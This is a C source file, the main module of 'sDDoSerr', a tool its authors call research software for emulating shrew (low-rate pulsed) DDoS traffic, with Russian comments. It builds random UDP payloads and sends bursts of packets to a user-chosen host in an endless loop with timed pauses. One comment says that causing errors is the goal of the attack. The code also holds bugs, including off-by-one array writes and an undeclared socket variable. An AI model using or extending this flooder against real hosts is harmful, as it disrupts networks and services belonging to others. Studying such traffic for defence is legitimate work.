/** 
  * sDDoSerr - the research programm for simulate shrew (D)DoS attack.
  * 
  * Основной модуль программы.
  * 
  * v.1.4.2.25a от 11.05.21.
  * !Не забывать изменять *argp_program_version 
  * под новую версию в парсере (cmd_parser.c), стр. 81!
  **/

/**
    This file is part of sDDoSerr.
sDDoSerr is a research program for emulating shrew (D)DoS traffic
(in development).
Use this program on your own pril and risk, as with improper use 
there is a risk of disruption of the network infrastucture.
DDoSerr Copyright © 2019 Konstantin Pankov 
(e-mail: konstantin.p.96@gmail.com), Mikhail Riapolov.

    sDDoSerr is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    Any distribution and / or change must be agreed with the authors and
    is prohibited without their permission.
    At this stage of the program development, authors are forbidden to 
    embed any of sDDoSerr modules (code components) into other programs.

    sDDoSerr is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with sDDoSerr.  If not, see <https://www.gnu.org/licenses/>.


    Этот файл — часть sDDoSerr.
sDDoSerr — это исследовательская программа для эмуляции "shrew" (D)DoS 
трафика (в разработке). 
Используйте эту программу на свой страх и риск, так как при неправильном
применении есть риск нарушения работы сетевой инфраструктуры.
sDDoSerr Copyright © 2019 Константин Панков 
(e-mail: konstantin.p.96@gmail.com), Михаил Ряполов.

   sDDoSerr - свободная программа: вы можете перераспространять ее и/или
   изменять ее на условиях Стандартной общественной лицензии GNU
   в том виде, в каком она была опубликована 
   Фондом свободного программного обеспечения; либо версии 3 лицензии, 
   либо (по вашему выбору) любой более поздней версии.

   Любое распространиение и/или изменение должно быть согласовано с
   авторами и запрещается без их разрешения.
   На данном этапе развития программы авторами запрещается встраивать 
   любой из модулей (компонентов кода) sDDoSerr в другие программы.

   sDDoSerr распространяется в надежде, что она будет полезной,
   но БЕЗО ВСЯКИХ ГАРАНТИЙ; даже без неявной гарантии ТОВАРНОГО ВИДА
   или ПРИГОДНОСТИ ДЛЯ ОПРЕДЕЛЕННЫХ ЦЕЛЕЙ. Подробнее см. в Стандартной
   общественной лицензии GNU.

   Вы должны были получить копию Стандартной общественной лицензии GNU
   вместе с этой программой. Если это не так, см.
   <https://www.gnu.org/licenses/>. 
 **/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "cmd_parser.h"
#include "udp_sender.h"

//#include <sys/timeb.h>  // ftime, timeb (для времени в миллисекундах).
#include <sys/time.h> 

//Для неблокированного терминала.
#include <termio.h>
#include <unistd.h>
#include <fcntl.h>

/* Массив для обычного времени. */
char current_time [32];
/* Ф-я получения обычного времени. */
int get_current_time ()
{        
    time_t time_now = time(NULL);
    strftime(current_time, sizeof(current_time),\
    "%d.%m.%Y в %H:%M:%S", localtime(&time_now));
    return 0;
}

/* Функция получения точного времени в миллисекундах. 
 *  Мало точности, надо хотябы в микросекундах!
long long int get_time ()
{
  struct timeb timer_msec;
  long long int timestamp_msec; // timestamp в миллисекундах.
  if (!ftime(&timer_msec)) {
  	timestamp_msec = ((long long int) timer_msec.time) * 1000ll +
  						(long long int) timer_msec.millitm;
  }
  else 
  {
  	timestamp_msec = -1;
  }
  printf("%lld milliseconds since Epoch\n", timestamp_msec);
  return timestamp_msec;
}
*/

/**
 * Функция получения точного времени в микросекундах.
 **/ 
long long int get_time ()
{
    struct timeval currentTime;
    gettimeofday(&currentTime, NULL);
    return currentTime.tv_sec * (long long int)1e6 + currentTime.tv_usec;
}

/** Для возможности прерывания бесконечного цикла 
 * (неблокированного терминала). **/
struct termios stdin_orig;  //Структура для сохранаения параметров.

void term_reset() 
    {
        tcsetattr(STDIN_FILENO,TCSANOW,&stdin_orig);
        tcsetattr(STDIN_FILENO,TCSAFLUSH,&stdin_orig);
    }

void term_nonblocking() 
    {
        struct termios newt;
        tcgetattr(STDIN_FILENO, &stdin_orig);
        fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK); //non-blocking
        newt = stdin_orig;
        newt.c_lflag &= ~(ICANON | ECHO);
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
        atexit(term_reset);
    }
        


int main (int argc, char *argv[])
{
    /* Файл лога. */
    FILE *log;
    log = fopen ("log.txt", "a+"); //Открытие файла. Поток log.
    
    
    /* Получение начального времени и запись в лог. */
    get_current_time();
    printf("sDDoSerr запущен %s. \n", current_time);
    fprintf(log, "\n%s %s%s \n", "sDDoSerr запущен ",\
    current_time, ".");
    //(файл или поток как файл, форматирование (полное), потом данные.)
    
    
    /* Запуск функции сдвоенного парсера и получение на выходе
     * структуры со всеми настройками программы. */
    struct Settings *settings = parser(argc, argv);
    if (settings->host == NULL)
    {
        printf("Ошибка запуска парсера! \n");
        fprintf(log, "%s \n", "Ошибка запуска парсера!");
        
        /* Очистка динамической памяти под структуру настроек. */
        free(settings);
                
        //Закрытие файла лога.
        fclose(log);
                
        exit(EXIT_FAILURE);
    }

    if (settings->debug == 1) //Если установлен флаг дебага.
        {
            printf("Запуск функции парсера выполнен. \n");
            printf("Запуск функции создания сокета. \n");
        }
        
    /* Вызов функции открытия сокета 
     * с передачей ей структуры настроек. */
    struct Socket udp_sock = udp_socket_open (settings);
    
    
    /* Структура сообщения. */
    struct Message message_struct;
    
    /* Массив из рандомных -дельт от максимальной длины сообщения. */
    int message_deltas[settings->num_deltas];
    
    //Инициализация генератора псевдорандомных чисел 
    //(тут seed - текущее время).
    srandom(time(0));
    
    if (settings->debug == 1)
        {printf("Отладка. \n");} //! Отладка.
        
    if (settings->num_deltas > 0)
    {
    /* Заполнение массива -дельт псевдорандомными числами. */
    for (int j = 0; j <= settings->num_deltas; j++)
        {
            message_deltas[j] = random() % (settings->message_size-1); 
            //От 0 до % максимум-1.
    //Т.е. при задании .. % 50 будут генерироваться числа от 0 до 49.
       
            //!Дебажный вывод содержимого массива.
            if (settings->debug == 1)
                {printf("Message_deltas [%i]: %d \n", j,\
                    message_deltas[j]);}
        }
    }
    if (settings->num_deltas == 0)
        {printf("Используется полное сообщение. Дельты отключены. \n");}
    if (settings->num_deltas < 0)
        {printf("Задано некорректное (отрицательное) значение дельт. \
            Будет использовано полное сообщение. \n");}
    
    
    if (settings->debug == 1)
        {printf("\n");} //! Отладка.
    
    
    
    if (settings->debug == 1)
        {printf("Динамическое выделение памяти под сообщение. \n");
        printf("message_size: %i \n", settings->message_size);
        }
    
    /* Динамическое выделение памяти под полное сообщение. */
    char *message_full = NULL;
    if ((message_full = \
    //malloc(settings->message_size*sizeof(char))) == NULL)
    malloc(settings->message_size*sizeof(char)+1)) == NULL) 
    //+1 чтобы терминация работала правильно.
        {
            printf("Ошибка выделения памяти под полное сообщение! \n");
            fprintf(log, "%s \n",\
                      "Ошибка выделения памяти под полное сообщение!");
            
            //Очистка динамической памяти под структуру настроек.
            free(settings);
                
            //Закрытие сокета.
            int udp_close = udp_closer(udp_socket);
                
            //Закрытие файла лога.
            fclose(log);
            
            //Выход
            exit(EXIT_FAILURE);
        }
    
    if (settings->debug == 1)
    {printf("Память под сообщение выделена успешно. \n");}
    
    /* Заполнение полного сообщения псевдорандомными символами. */
    //ASCII_START 32, ASCII_END 126
    for (int i = 0; i <= settings->message_size; i++)
    {
        message_full[i] = (char) (random() % (126-32))+32;
        //message_full[i] = '0'; //(или) Забивание нулями.
    }
    message_full[settings->message_size] = '\0'; //Терминация.
    
    //Вывод (не)терминированного сообщения.
    if (settings->debug == 1)
        {
            printf("Полное сообщение: %.*s \n", settings->message_size,\
            message_full);
        }
            
    if (settings->debug == 1)
        {printf("Вход в цикл отправки одной пачки. \n");}
    
    
    /* Запись указателя на начало полного сообщения 
     * для считывания кропа. */
    message_struct.message = message_full;
    
    /* Начальное и конечное время отправки "пачки" пакетов.
     * Затраченное время на отправку "пачки" пакетов. 
     * + То же самое для полного времени работы.*/
    long long int pack_start_time = 0, pack_end_time = 0, pack_time = 0;
    long long int start_time = 0, end_time = 0, elapsed_time = 0;
    
    /* Начальное и конечное время отправки одного сообщения. */
    long long int message_start_time = 0;
    long long int message_end_time = 0;
    long long int message_time = 0;
    
    /* Пауза между отправкой "пачек". */
    long int start_pause = 0;
    
    
    /** Бесконечный цикл на отправку "пачек" пакетов с паузой **/
    //Для дебага.
    //Счётчик итераций полного цикла.
    //Может переполниться при длительном использовании программы
    //со включенным дебагом!
    long long int cycle_counter = 0;
    
    /* Вызов функции неблокируемого ввода в терминал 
     * для выхода по нажатию 'q'. */
    term_nonblocking();

    int key = 0; //Считанный код нажатой кнопки.
    
    //Подготовка
    //! Для ф-ции nanosleep() - пауза между отправками "пачек".
    /* Структура с настройками паузы перед повтором отправки "пачки". */
    //Оставлена внутри цикла, т.к. это время должно изменяться.
    struct timespec ns_time, ns_time2;
    
    //Переменные для временени паузы перед повтором отправки "пачек".
    time_t ns_time_s = 0;
    long ns_time_ns = 0;
    
    /** Начало цикла отправки "пачек" пакетов. **/
    for (;;)
    {
        /* Обработка нажатий кнопок. */
        key = getchar();
        
        /* Если нажата 'q' или 'Q', или 'й', или 'Й', то выход
         * из бесконечного цикла. */
        if (key == 'q' || key == 'Q' || key == 185 || key == 153)
            {
                printf("\n Exit. \n");
                break;
            }
    
    //Получение времени начала отправки.
    if (settings->debug == 2)
            {                
                start_time = get_time();
            }
    
    //Конвертация времени паузы
    if (settings->start_pause < 1000)
    {
        ns_time_s = 0;
        ns_time_ns = settings->start_pause * 1000000;
        ns_time.tv_sec = ns_time_s; //Время паузы, в секундах.
        //В наносекундах. С переводом из мс в нс.
        ns_time.tv_nsec = ns_time_ns; 
    }
    //100000000 ns = 100 ms.
    
    if (settings->start_pause >= 1000)
    {
        ns_time_s = settings->start_pause / 1000; //Целое = секунды.
        ns_time_ns = (settings->start_pause % 1000) * 1000000;
        //Остаток = микросекунды, переводим в наносекунды.
        ns_time.tv_sec = ns_time_s;
        ns_time.tv_nsec = ns_time_ns;
    }
    
    
    if (settings->debug >= 1)
            {
                printf("%lli-я итерация полного цикла. \n",\
                cycle_counter);
                fprintf(log, "%lli%s \n\n",\
                cycle_counter, "-я итерация полного цикла.");
                
                printf("Пауза между 'пачками': %i сек. %li нс. \n",\
                ns_time_s, ns_time_ns);
            }
    
    
    /** Цикл по settings->pack_size на отправку ОДНОЙ "пачки" пакетов.**/
    
    if (settings->debug == 2)
            {                
                pack_start_time = get_time();
            }
    
    int di = 0; //Счётчик итерации для дельт.
    for (int i = 1; i <= settings->pack_size; i++)
    {
        if (settings->debug >= 1)
            {
                printf("%i-я итерация цикла пачки. \n", i);
                fprintf(log, "%i%s \n", i, "-я итерация цикла пачки.");
            }
            
        
        /**Считывание значения -дельты из message_deltas,
        * "откусывание" от полного сообщения
        * и запись в поле структуры. 
        * Вычисление и запись размера кропнутого сообщения.
        * Проверять маркер цикла считывания на выход за размер 
        * settings->num_deltas.
        **/
        
        if (settings->num_deltas > 0)
        {
        if (di > settings->num_deltas)
            {
                di = 0; //Если дельт больше, чем пакетов в пачке, 
                //то с начала.
            }
        
        
        /* Размер кропнутого сообщения. */
        message_struct.mes_size = \
        settings->message_size-message_deltas[di];
        
        /* В конце считывания дельт инкремент счётчика. */
        di++;
        }
        
        if (settings->num_deltas <= 0)
            {
                message_struct.mes_size = settings->message_size;
            }
        
        
        
        //Отладка.
        if (settings->debug >= 1)
            {
                printf("Запись кропнутого сообщения в поле структуры \n");
                printf("Обрезанное сообщение: %.*s \n",\
                message_struct.mes_size, message_struct.message);
                printf("Размер обрезанного сообщения: %i \n",\
                message_struct.mes_size);
            }
            
        /* Вызов функции отправки сообщений. */
        if (settings->debug >= 1)
            {printf("Вызов функции отправки. \n");}
                
        if (settings->debug == 2)
            {    
                //Получение времени начала отправки сообщения.
                message_start_time = get_time();
            }
    
        
        int udp_send;
        if (udp_send = udp_sender (udp_socket, message_struct) != 0)
            {   
                //Если при отправке сообщения что-то пошло не так.
                printf("Ошибка отправки пакета. \n");
                fprintf(log, "%s\n", "Ошибка отправки пакета. \n");
                
                /*            
                 * Не нужно выходить из программы при ошибке отправки,
                 * т.к. создание ошибок - цель атаки. :)
                */
            }
        
        //Зануление полей структуры (если требуется).
        
        if (settings->debug == 2)
            {
                //Получение времени окончания отправки сообщения.
                message_end_time = get_time();
                message_time = message_end_time - message_start_time;
                printf("Затраченное время на отправку сообщения:"\
                " %lld мкс \n", message_time);
                
                fprintf(log, "%s %lld%s \n\n",\
                "Затраченное время на отправку сообщения: ",\
                message_time, " мкс.");
            }
        
    }
    //! Конец цикла на отправку одной "пачки" пакетов.
    
    /* Вывод времени отправки одной "пачки" пакетов. */
    if (settings->debug == 2)
            {
                pack_end_time = get_time();
                
                pack_time = pack_end_time - pack_start_time;
                printf("Затраченное время на отправку 'пачки' пакетов:"\
                " %lld мкс. \n", pack_time);
                
                fprintf(log, "%s %lld%s \n",\
                "Затраченное время на отправку 'пачки' пакетов: ",\
                pack_time, " мкс.");
            }
    
    /** Вызов ф-ции nanosleep() для создания паузы 
     * между отправкой "пачек". **/
    if (nanosleep(&ns_time, &ns_time2) < 0)
        {
            printf("Ошибка вызова nanosleep. \n");
            fprintf(log, "\n%s\n", "Ошибка вызова nanosleep.");
            return 1;
            //Возможно, не надо выходить из цикла при ошибке?
            break;
        }
        
        //Для дебага.
        if (settings->debug >= 1)
            {
                cycle_counter++;
            }
        
        if (settings->debug == 2)
            {                
                end_time = get_time();
                elapsed_time = end_time - start_time;
                printf("\nВремя итерации полного цикла: %lld мкс.\n",\
                elapsed_time);
                
                fprintf(log, "\n%s %lld%s \n\n\n",\
                "Время итерации полного цикла: ",\
                elapsed_time, " мкс.");
            }
    
    }
    /** Конец цикла отправки "пачек" пакетов. **/
    
    
    if (settings->debug == 1)
        {printf("Закрытие сокета. \n");}
    
    /* Закрытие сокета. */
    int udp_close = udp_closer(udp_socket);

    if (settings->debug == 1)
        {
         printf("Очистка динамической памяти под полное сообщение. \n");
        }
    /* Очистка динамической памяти под полное сообщение. */
    free(message_full);
    message_full = NULL;
    

    //Отладка.
    if (settings->debug == 1)
        {
            printf("*DEBUG* \n" \
            "host = %s, port = %s, message_size = %i, "\
            "protocol = %i, procnum = %i \n" \
            "*DEBUG* \n",\
            settings->host, settings->port, settings->message_size,\
            settings->protocol, settings->procnum);
        }
        
    
    if (settings->debug == 1)
        {
            printf("host: %p, host_string: %s \n",\
            settings->host, settings->host);
        }
    
        
    if (settings->debug == 1)
        {
         printf("Очистка динамической памяти под хост. \n");
        }
        
    /* Очистка динамической памяти под хост. */
    free(settings->host);
    settings->host = NULL;
    //Проблема была в методе записи переменной хоста.
    
    
    if (settings->debug == 1)
        {
         printf("Очистка динамической памяти под настройки. \n");
        }
    /* Очистка динамической памяти под структуру настроек. */
    free(settings);
    settings = NULL;
    
    
    /* Получение конечного времени и запись в лог. */
    get_current_time();
    printf("sDDoSerr остановлен %s. \n", current_time);
    fprintf(log, "\n%s %s%s \n", "sDDoSerr остановлен ",\
    current_time, ".");
    
        
    /* Закрытие файла лога. */
    fclose(log);
    
    return 0;
}
